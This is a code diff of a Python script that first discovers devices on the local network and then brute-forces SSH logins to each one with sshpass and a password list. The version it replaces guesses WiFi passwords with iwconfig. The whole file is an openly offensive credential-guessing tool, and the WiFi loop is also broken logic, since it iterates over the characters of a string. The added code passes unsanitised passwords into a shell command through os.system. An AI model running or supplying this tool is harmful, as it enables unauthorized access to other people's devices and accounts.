@@ -1,35 +1,39 @@
 import os
 import subprocess
 
-def lan_scan():
-    # Perform a LAN scan using the arp-scan command
-    subprocess.call(["arp-scan", "--localnet"])
+def scan_network():
+    # Perform a LAN scan to discover active devices
+    scan_result = subprocess.check_output(['arp', '-a']).decode('utf-8')
+    devices = []
+    
+    # Extract IP addresses from the scan result
+    for line in scan_result.splitlines():
+        if 'ether' in line:
+            ip_address = line.split('(')[1].split(')')[0]
+            devices.append(ip_address)
+    
+    return devices
 
-def bruteforce_wifi_passwords(file_path):
-    # Read the file containing a list of passwords
-    with open(file_path, 'r') as file:
-        passwords = file.readlines()
+def brute_force_passwords(devices, password_file):
+    # Iterate through the list of devices
+    for device in devices:
+        # Try each password from the password file
+        with open(password_file, 'r') as file:
+            for password in file:
+                password = password.strip()
+                command = f'sshpass -p {password} ssh user@{device} -o ConnectTimeout=1'
+                
+                # Attempt to connect to the device using SSH
+                result = os.system(command)
+                
+                # If the connection is successful, print the password and exit
+                if result == 0:
+                    print(f'Password found: {password}')
+                    return
     
-    # Remove newline characters from each password
-    passwords = [password.strip() for password in passwords]
-    
-    # Get the list of available WiFi networks
-    networks = subprocess.check_output(["iwlist", "wlan0", "scan"]).decode('utf-8')
-    
-    # Iterate over each network and try each password
-    for network in networks:
-        for password in passwords:
-            # Connect to the WiFi network using the current password
-            result = subprocess.call(["iwconfig", "wlan0", "essid", network, "key", password])
-            
-            # Check if the connection was successful
-            if result == 0:
-                print(f"Successfully connected to {network} with password: {password}")
-                return
-    
-    print("No WiFi network could be connected with the provided passwords.")
+    print('Password not found')
 
-# Example usage
-file_path = "passwords.txt"
-lan_scan()
-bruteforce_wifi_passwords(file_path)
+# Usage
+devices = scan_network()
+password_file = 'passwords.txt'
+brute_force_passwords(devices, password_file)
